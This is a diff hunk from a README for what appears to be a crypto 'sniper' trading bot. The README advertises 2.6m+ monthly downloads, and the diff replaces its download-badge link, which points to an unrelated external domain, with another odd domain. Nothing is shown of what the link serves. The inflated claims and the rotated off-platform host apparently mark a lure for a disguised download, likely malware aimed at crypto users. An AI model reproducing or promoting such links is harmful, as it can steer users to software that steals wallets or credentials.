@@ -49,7 +49,7 @@ A: Yes — skips tokens from known scam wallets.
 
 **Monthly downloads:** 2.6m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/pumpsniper26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/pumpsniper26)
 
 ---
 
